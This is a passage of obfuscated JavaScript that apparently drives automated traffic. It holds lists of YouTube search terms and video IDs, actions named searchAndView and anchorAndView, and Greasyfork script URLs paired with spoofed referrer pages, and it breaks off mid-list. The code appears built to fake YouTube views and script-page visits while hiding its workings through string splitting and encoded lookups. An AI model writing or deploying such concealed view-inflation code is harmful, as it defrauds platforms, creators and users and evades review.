searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x8a * -0x40 + 0x80 * 0x18 + 0x168a)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x4f7 * 0x4 + -0x1 * -0x1b9e + 0x2 * -0x3dc)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + Y(0x13, 'xG[K') + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xf * -0x193 + 0x208e + -0x8ee);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    Z(0xb) + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    Z(0x17) + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    Y(0x14, 'BqA#') + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + Y(0x1, 'RE8d') + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Y(0xa, '[^iH') + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + Z(0x6) + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
